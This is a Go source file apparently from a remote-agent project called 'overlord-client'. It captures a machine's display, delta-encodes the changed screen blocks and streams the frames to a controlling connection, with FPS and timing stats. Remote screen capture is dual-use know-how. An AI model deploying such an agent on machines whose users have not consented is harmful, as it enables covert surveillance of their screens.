package capture

import (
	"bytes"
	"context"
	"encoding/binary"
	"image"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func Loop(ctx context.Context, env *rt.Env) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("capture: panic in Loop recovered: %v", r)
		}
	}()

	if env.Cfg.DisableCapture {
		log.Printf("capture: disabled by config, sending black placeholder")

		if err := sendBlackFrame(ctx, env); err != nil {
			log.Printf("capture: black frame failed: %v", err)
		}
	} else if supportsCapture() {

		done := make(chan struct{})
		go func() {
			defer close(done)
			defer func() {
				if r := recover(); r != nil {
					log.Printf("capture: panic during initial frame: %v", r)
				}
			}()
			if err := CaptureAndSend(ctx, env); err != nil {
				log.Printf("capture: initial frame failed: %v (continuing anyway)", err)
			} else {
				log.Printf("capture: initial frame sent")
			}
		}()

		select {
		case <-done:

		case <-time.After(3 * time.Second):
			log.Printf("capture: initial frame timed out after 3s (continuing anyway)")
		}
	} else {
		log.Printf("capture: no displays detected; skipping initial frame")
	}
	<-ctx.Done()
}

func Now(ctx context.Context, env *rt.Env) error {
	if env.Cfg.DisableCapture {
		return sendBlackFrame(ctx, env)
	}
	if !supportsCapture() {
		return nil
	}
	return CaptureAndSend(ctx, env)
}

func CaptureAndSend(ctx context.Context, env *rt.Env) error {

	defer func() {
		if r := recover(); r != nil {
			log.Printf("capture: panic in CaptureAndSend: %v", r)
		}
	}()

	if activeDisplays() == 0 {
		log.Printf("capture: no displays available")
		return nil
	}
	display := env.SelectedDisplay
	if display < 0 || display >= safeDisplayCount() {
		display = 0
		log.Printf("capture: requested display %d out of range, defaulting to 0 (monitors=%d)", env.SelectedDisplay, safeDisplayCount())
	}
	t0 := time.Now()
	img, err := safeCaptureDisplay(display)
	if err != nil {
		log.Printf("capture: capture failed: %v (sending black frame)", err)
		return sendBlackFrame(ctx, env)
	}
	if img == nil {
		log.Printf("capture: capture returned nil image (sending black frame)")
		return sendBlackFrame(ctx, env)
	}
	captureDur := time.Since(t0)

	quality := jpegQuality()
	frame, encodeDur, err := buildFrame(img, display, quality)
	if err != nil {
		return err
	}
	now := time.Now()
	fps := frameFPS(now)
	if fps <= 0 {
		fps = 1
	}
	frame.Header.FPS = fps
	sendStart := time.Now()
	err = wire.WriteMsg(ctx, env.Conn, frame)
	sendDur := time.Since(sendStart)
	if shouldLogFrame(now) {
		total := time.Since(t0)
		frames := statFrames.Load()
		capAvg := avgMs(statCapNs.Load(), frames)
		encAvg := avgMs(statEncNs.Load(), frames)
		sendAvg := avgMs(statSendNs.Load(), frames)
		totalAvg := avgMs(statTotalNs.Load(), frames)
		bytesAvg := avgBytes(statBytes.Load(), frames)
		detectAvg := avgMs(statDetectNs.Load(), frames)
		mergeAvg := avgMs(statMergeNs.Load(), frames)
		blkJpegAvg := avgMs(statBlkJpegNs.Load(), frames)
		prevCopyAvg := avgMs(statPrevCopyNs.Load(), frames)
		full := statFullFrames.Load()
		blocks := statBlockFrames.Load()
		keep := statKeepaliveFrames.Load()
		regions := statBlockRegions.Load()
		fallbacks := statBlockFallbacks.Load()
		avgRegions := float64(0)
		if blocks > 0 {
			avgRegions = float64(regions) / float64(blocks)
		}
		log.Printf("capture: stream display=%d fps≈%d format=%s size=%d cap=%s enc=%s send=%s total=%s | avg cap=%.2fms enc=%.2fms send=%.2fms total=%.2fms avgSize=%.0fB frames=%d detect=%.2fms merge=%.2fms blkJpeg=%.2fms prevCopy=%.2fms full=%d blocks=%d keep=%d fallbacks=%d avgRegions=%.2f", display, fps, frame.Header.Format, len(frame.Data), captureDur, encodeDur, sendDur, total, capAvg, encAvg, sendAvg, totalAvg, bytesAvg, frames, detectAvg, mergeAvg, blkJpegAvg, prevCopyAvg, full, blocks, keep, fallbacks, avgRegions)
		resetStats()
	}

	statFrames.Add(1)
	statCapNs.Add(captureDur.Nanoseconds())
	statEncNs.Add(encodeDur.Nanoseconds())
	statSendNs.Add(sendDur.Nanoseconds())
	statTotalNs.Add(time.Since(t0).Nanoseconds())
	statBytes.Add(int64(len(frame.Data)))
	return err
}

func supportsCapture() bool {
	return safeDisplayCount() > 0
}

func safeCaptureDisplay(display int) (*image.RGBA, error) {
	defer func() {
		_ = recover()
	}()
	img, err := captureDisplayFn(display)
	if err != nil {
		return nil, err
	}
	return img, nil
}

func safeDisplayCount() int {
	defer func() {
		_ = recover()
	}()
	return displayCount()
}

func sendBlackFrame(ctx context.Context, env *rt.Env) error {

	img := image.NewRGBA(image.Rect(0, 0, 64, 64))

	quality := 60
	frame, _, err := buildFrame(img, 0, quality)
	if err != nil {
		return err
	}
	frame.Header.FPS = 1
	return wire.WriteMsg(ctx, env.Conn, frame)
}

func MonitorCount() int {
	n := safeDisplayCount()
	if n <= 0 {
		return 1
	}
	return n
}

const frameLogInterval = 5 * time.Second

var (
	fpsWindowStart atomic.Int64
	fpsCount       atomic.Int64
	fpsLatest      atomic.Int64
	lastFrameLog   atomic.Int64
	lastKeyframe   atomic.Int64

	statFrames          atomic.Int64
	statCapNs           atomic.Int64
	statEncNs           atomic.Int64
	statSendNs          atomic.Int64
	statTotalNs         atomic.Int64
	statBytes           atomic.Int64
	statDetectNs        atomic.Int64
	statMergeNs         atomic.Int64
	statBlkJpegNs       atomic.Int64
	statPrevCopyNs      atomic.Int64
	statFullFrames      atomic.Int64
	statBlockFrames     atomic.Int64
	statKeepaliveFrames atomic.Int64
	statBlockRegions    atomic.Int64
	statBlockFallbacks  atomic.Int64

	overrideQuality atomic.Int64
	overrideCodec   atomic.Value

	prevMu    sync.Mutex
	prevFrame *prevImage
)

type prevImage struct {
	w   int
	h   int
	pix []byte
}

func frameFPS(now time.Time) int {
	start := fpsWindowStart.Load()
	if start == 0 {
		if fpsWindowStart.CompareAndSwap(0, now.UnixNano()) {
			fpsCount.Store(1)
			return int(fpsLatest.Load())
		}
		start = fpsWindowStart.Load()
	}

	fpsCount.Add(1)
	elapsed := time.Duration(now.UnixNano() - start)
	if elapsed >= time.Second {
		frames := fpsCount.Swap(0)
		if frames > 0 {
			fps := int(float64(frames) / elapsed.Seconds())
			fpsLatest.Store(int64(fps))
		}
		fpsWindowStart.Store(now.UnixNano())
	}

	return int(fpsLatest.Load())
}

func shouldLogFrame(now time.Time) bool {
	last := time.Unix(0, lastFrameLog.Load())
	if now.Sub(last) >= frameLogInterval {
		lastFrameLog.Store(now.UnixNano())
		return true
	}
	return false
}

func jpegQuality() int {

	if q := overrideQuality.Load(); q > 0 {
		return int(q)
	}
	q := int(loadOnceInt(&cachedJPEGQuality, 95))
	if q < 20 {
		q = 20
	}
	if q > 100 {
		q = 100
	}
	return q
}

var (
	jpegQualityOnce   sync.Once
	cachedJPEGQuality int64
	blockCodecOnce    sync.Once
	cachedBlockCodec  string
)

func loadOnceInt(target *int64, def int) int64 {
	jpegQualityOnce.Do(func() {
		if env := os.Getenv("OVERLORD_JPEG_QUALITY"); env != "" {
			if v, err := strconv.Atoi(env); err == nil {
				*target = int64(v)
				return
			}
		}
		*target = int64(def)
	})
	return atomic.LoadInt64(target)
}

func resetStats() {
	statFrames.Store(0)
	statCapNs.Store(0)
	statEncNs.Store(0)
	statSendNs.Store(0)
	statTotalNs.Store(0)
	statBytes.Store(0)
	statDetectNs.Store(0)
	statMergeNs.Store(0)
	statBlkJpegNs.Store(0)
	statPrevCopyNs.Store(0)
	statFullFrames.Store(0)
	statBlockFrames.Store(0)
	statKeepaliveFrames.Store(0)
	statBlockRegions.Store(0)
	statBlockFallbacks.Store(0)
}

func avgMs(ns int64, frames int64) float64 {
	if frames == 0 {
		return 0
	}
	return float64(ns) / 1e6 / float64(frames)
}

func avgBytes(b int64, frames int64) float64 {
	if frames == 0 {
		return 0
	}
	return float64(b) / float64(frames)
}

const (
	blockSize     = 64
	maxBlockRatio = 0.40
	keyframeEvery = 5 * time.Second
	enableBlocks  = true
	samplingRate  = 3
	minBlockSize  = 32
	changeThresh  = 3
	blockMargin   = 8
	blockCodecEnv = "OVERLORD_BLOCK_CODEC"
)

func buildFrame(img *image.RGBA, display int, quality int) (wire.Frame, time.Duration, error) {
	encStart := time.Now()
	width := img.Bounds().Dx()
	height := img.Bounds().Dy()
	full := false
	now := time.Now()
	codec := blockCodec()

	if !enableBlocks {
		jpegBytes, err := encodeJPEG(img, quality)
		prevMu.Lock()
		copyPrev(img)
		prevMu.Unlock()
		return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg"}, Data: jpegBytes}, time.Since(encStart), err
	}

	prevMu.Lock()
	pf := prevFrame
	prevMu.Unlock()

	if pf == nil || pf.w != width || pf.h != height {
		full = true
	}

	if !full && keyframeEvery > 0 {
		last := time.Unix(0, lastKeyframe.Load())
		if now.Sub(last) >= keyframeEvery {
			full = true
		}
	}

	if full {
		jpegBytes, err := encodeJPEG(img, quality)
		prevMu.Lock()
		copyPrev(img)
		prevMu.Unlock()
		lastKeyframe.Store(now.UnixNano())
		statFullFrames.Add(1)
		return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg"}, Data: jpegBytes}, time.Since(encStart), err
	}

	blocks, blockPayload, encDur, err := encodeBlocks(img, pf, quality, codec)
	if err != nil {
		return wire.Frame{}, encDur, err
	}

	if blocks == 0 {

		prevMu.Lock()
		copyPrev(img)
		prevMu.Unlock()
		statKeepaliveFrames.Add(1)
		return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "blocks"}, Data: blockPayload}, encDur, nil
	}

	totalBlocks := ((width + blockSize - 1) / blockSize) * ((height + blockSize - 1) / blockSize)
	changedRatio := float64(blocks) / float64(totalBlocks)

	if changedRatio > maxBlockRatio {
		jpegBytes, err := encodeJPEG(img, quality)
		prevMu.Lock()
		copyPrev(img)
		prevMu.Unlock()
		lastKeyframe.Store(now.UnixNano())
		statBlockFallbacks.Add(1)
		statFullFrames.Add(1)
		return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg"}, Data: jpegBytes}, time.Since(encStart), err
	}

	statBlockFrames.Add(1)
	statBlockRegions.Add(int64(blocks))
	format := "blocks"
	if codec == "raw" {
		format = "blocks_raw"
	}
	return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: format}, Data: blockPayload}, encDur, nil
}

func encodeBlocks(img *image.RGBA, prev *prevImage, quality int, codec string) (int, []byte, time.Duration, error) {
	width := img.Bounds().Dx()
	height := img.Bounds().Dy()
	stride := img.Stride
	prevStride := prev.w * 4

	blocksWide := (width + blockSize - 1) / blockSize
	blocksHigh := (height + blockSize - 1) / blockSize
	changedGrid := make([]bool, blocksWide*blocksHigh)

	changedCount := 0
	passDetectStart := time.Now()
	for by := 0; by < blocksHigh; by++ {
		for bx := 0; bx < blocksWide; bx++ {
			x := bx * blockSize
			y := by * blockSize
			ww := blockSize
			hh := blockSize
			if x+ww > width {
				ww = width - x
			}
			if y+hh > height {
				hh = height - y
			}

			if blockChanged(img.Pix, prev.pix, stride, prevStride, x, y, ww, hh) {
				changedGrid[by*blocksWide+bx] = true
				changedCount++
			}
		}
	}

	statDetectNs.Add(time.Since(passDetectStart).Nanoseconds())

	if changedCount == 0 {
		buf := bytes.Buffer{}
		_ = binary.Write(&buf, binary.LittleEndian, uint16(width))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(height))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(0))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(0))
		return 0, buf.Bytes(), 0, nil
	}

	mergeStart := time.Now()
	type rect struct{ x, y, w, h int }
	var regions []rect
	visited := make([]bool, len(changedGrid))

	for by := 0; by < blocksHigh; by++ {
		for bx := 0; bx < blocksWide; bx++ {
			idx := by*blocksWide + bx
			if !changedGrid[idx] || visited[idx] {
				continue
			}

			endX := bx
			for endX+1 < blocksWide && changedGrid[by*blocksWide+endX+1] && !visited[by*blocksWide+endX+1] {
				endX++
			}

			endY := by
			canExpandY := true
			for canExpandY && endY+1 < blocksHigh {
				for tx := bx; tx <= endX; tx++ {
					if !changedGrid[(endY+1)*blocksWide+tx] || visited[(endY+1)*blocksWide+tx] {
						canExpandY = false
						break
					}
				}
				if canExpandY {
					endY++
				}
			}

			for ry := by; ry <= endY; ry++ {
				for rx := bx; rx <= endX; rx++ {
					visited[ry*blocksWide+rx] = true
				}
			}

			x := bx * blockSize
			y := by * blockSize
			w := ((endX + 1) * blockSize)
			h := ((endY + 1) * blockSize)

			if x >= blockMargin {
				x -= blockMargin
				w += blockMargin
			} else {
				w += x
				x = 0
			}
			if y >= blockMargin {
				y -= blockMargin
				h += blockMargin
			} else {
				h += y
				y = 0
			}

			w += blockMargin
			h += blockMargin

			if w > width {
				w = width
			}
			if h > height {
				h = height
			}
			w -= x
			h -= y

			regions = append(regions, rect{x: x, y: y, w: w, h: h})
		}
	}

	statMergeNs.Add(time.Since(mergeStart).Nanoseconds())

	buf := bytes.Buffer{}
	_ = binary.Write(&buf, binary.LittleEndian, uint16(width))
	_ = binary.Write(&buf, binary.LittleEndian, uint16(height))
	_ = binary.Write(&buf, binary.LittleEndian, uint16(len(regions)))
	_ = binary.Write(&buf, binary.LittleEndian, uint16(0))

	totalEncDur := time.Duration(0)
	for _, r := range regions {
		t0 := time.Now()
		var payload []byte
		var err error
		if codec == "raw" {
			payload = encodeBlockRaw(img, r.x, r.y, r.w, r.h)
		} else {

			blockQuality := quality + 10
			if blockQuality > 100 {
				blockQuality = 100
			}
			payload, err = encodeJPEG(img.SubImage(image.Rect(r.x, r.y, r.x+r.w, r.y+r.h)), blockQuality)
		}
		blockDur := time.Since(t0)
		totalEncDur += blockDur
		statBlkJpegNs.Add(blockDur.Nanoseconds())
		if err != nil {
			return len(regions), nil, totalEncDur, err
		}
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.x))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.y))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.w))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.h))
		_ = binary.Write(&buf, binary.LittleEndian, uint32(len(payload)))
		buf.Write(payload)
	}

	prevCopyStart := time.Now()
	prevMu.Lock()
	copyPrev(img)
	prevMu.Unlock()
	statPrevCopyNs.Add(time.Since(prevCopyStart).Nanoseconds())

	return len(regions), buf.Bytes(), totalEncDur, nil
}

func blockChanged(cur, prev []byte, curStride, prevStride int, x, y, w, h int) bool {
	changedPixels := 0
	sampledPixels := 0

	for row := 0; row < h; row += samplingRate {
		for col := 0; col < w; col += samplingRate {
			sampledPixels++
			ci := (y+row)*curStride + (x+col)*4
			pi := (y+row)*prevStride + (x+col)*4

			if ci+3 >= len(cur) || pi+3 >= len(prev) {
				continue
			}

			dr := int(cur[ci]) - int(prev[pi])
			dg := int(cur[ci+1]) - int(prev[pi+1])
			db := int(cur[ci+2]) - int(prev[pi+2])

			if dr < 0 {
				dr = -dr
			}
			if dg < 0 {
				dg = -dg
			}
			if db < 0 {
				db = -db
			}

			if dr > changeThresh || dg > changeThresh || db > changeThresh {
				changedPixels++

				if sampledPixels > 20 && changedPixels*33 > sampledPixels {
					return true
				}
			}
		}
	}

	if sampledPixels == 0 {
		return false
	}
	return changedPixels*33 > sampledPixels
}

func copyPrev(img *image.RGBA) {
	width := img.Bounds().Dx()
	height := img.Bounds().Dy()
	buf := make([]byte, len(img.Pix))
	copy(buf, img.Pix)
	prevFrame = &prevImage{w: width, h: height, pix: buf}
}

func encodeBlockRaw(img *image.RGBA, x, y, w, h int) []byte {
	stride := img.Stride
	buf := make([]byte, w*h*4)
	dst := 0
	srcBase := y*stride + x*4
	for row := 0; row < h; row++ {
		src := srcBase + row*stride
		copy(buf[dst:dst+w*4], img.Pix[src:src+w*4])
		dst += w * 4
	}
	return buf
}

func blockCodec() string {
	if v := overrideCodec.Load(); v != nil {
		if s, ok := v.(string); ok && s != "" {
			return s
		}
	}
	blockCodecOnce.Do(func() {
		codec := strings.ToLower(os.Getenv(blockCodecEnv))
		switch codec {
		case "raw", "rgba":
			cachedBlockCodec = "raw"
		case "jpeg", "":
			cachedBlockCodec = "jpeg"
		default:
			cachedBlockCodec = "jpeg"
		}
	})
	return cachedBlockCodec
}

func SetQualityAndCodec(quality int, codec string) {
	if quality > 0 {
		if quality > 100 {
			quality = 100
		}
		overrideQuality.Store(int64(quality))
	}
	s := strings.ToLower(strings.TrimSpace(codec))
	switch s {
	case "raw", "rgba", "jpeg":
		overrideCodec.Store(s)
	case "":

	default:
		overrideCodec.Store("jpeg")
	}
}
